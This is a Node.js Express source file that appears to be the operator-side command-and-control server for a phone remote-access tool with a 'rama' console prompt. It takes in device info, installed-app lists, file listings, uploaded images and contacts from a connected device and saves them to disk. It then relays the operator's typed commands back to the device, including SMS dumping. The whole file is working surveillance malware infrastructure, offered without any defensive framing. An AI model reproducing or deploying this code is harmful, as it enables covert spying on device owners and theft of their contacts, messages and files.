const express=require("express"); //api module
const prom=require("prompt-sync"); //api module
const { execSync } = require('child_process')
const prompt=prom(); //for user input module
const nanospinner=require("nanospinner") //for make loading spinnger moulde
const app=express(); //use express function
const fs=require("fs"); //file maneger module
const bodyParser = require('body-parser');
const multer=require("multer");
//const cors = require('cors');

app.use(express.json());

function shell(command){
	console.log(execSync(command,{encoding:'utf8'}))
}

shell("python3 server/table.py")
//set multer for receiving files
//here set disk to save and configer file
const disk=multer.diskStorage(
  {
    //set destination to save file
    destination:function(req,file,cb){
      cb(null,".",function (error,sucess){
        if(error){
          console.log(error);
        }
      })
    },
    //set file name to save
    filename:function(req,file,cb){
      cb(null,file.originalname,function(error,sucess){
        if(error){
          console.log(error);
        }
      })
    }
  }
)

const upload=multer({storage:disk})//now set configer dist 
// /img is path whare to upload imag image is name ling {image: filepath}
app.post("/img",upload.single("image"),(req,res,next)=>{
  res.send("done");
});
//end multer

//get req to check
app.get("/check",(req,res)=>{
  res.send("done")
})
// 
var listeningSpnner = nanospinner.createSpinner("listening port "+process.argv[2]); //make spinner which use listening as loading text NOTE: spinner not start now it's like object
app.post("/",(req,res)=>{
	//first condition
	if(req.body.data){ //check if req.body.data has some response then run this
     if(req.body.data=="Connected"){ //check if req.body.data has respone Connected then 
       listeningSpnner.success(); //spinner is done
   }else if(req.body.data=="none command not define"){
	   //do nothing
   }else{
	  console.log("\033[92m"+req.body.data)
    }
	}//first condition end

  // 2 condition 
  else if(req.body.Info){ // check if req.body.data has some respone then NOTE:= it run when app give device info as response
		const DeviceInfo=JSON.parse(req.body.Info); //parse device info data to print on screen 
		for(key in DeviceInfo){
			console.log("\033[92m"+key+"\033[0m : "+DeviceInfo[key]+""); //print device info in console
		}
	}// 2 condition end
  
  // 3 conditon 
	else if(req.body.packages){ //it run when app send installed app name as response
		const fileName=prompt("FILE NAME TO SAVE LIST : ");//as for file to insert installed app name
		fs.writeFileSync(fileName,req.body.packages); //write file and append 
		console.log("SAVE TO : "+fileName);
	}// 3 condition end

  // 4 condition 
  else if(req.body.files){ // not done yet so no comments
    const files=req.body.files;
    const jsonfile=JSON.parse(files);
    const allkeys=Object.keys(jsonfile);
    for(const key in jsonfile){
      console.log("\033[92m"+jsonfile[key]);
    }
  }
	// 5 conditions
	else if(req.body.contact){ //it run when app give contacts in respone
		const file=prompt("FILE NAME TO SAVE : ");
		if(file==""){
			//
		}else{
			fs.writeFileSync(file,"")
			fs.appendFileSync(file,req.body.contact);
      //console.log("\033[0m"+req.body.contact);
			console.log("\033[92mSAVE TO \033[0m "+file);
		}
	}// 5 condition end

	//main response / commmand
	const response=prompt("\033[0m(\033[93m"+req.header('x-forwarded-for') +"\033[0m)\033[91m@\033[0m"+"\033[96mrama \033[0m> ");
	if(response=="clear"){
		console.clear()
		res.send("none")
	}else if(response=="help"){
		shell("python3 server/table.py")
		res.send("none")
	}else{
		res.status(200);
		res.send(response);//send response like dump_sms and etc.
	}
});

var PORT=process.argv[2];

//console.log("\033[96mListening "+PORT)
app.listen(PORT,listeningSpnner.start()); //start listring and spinner
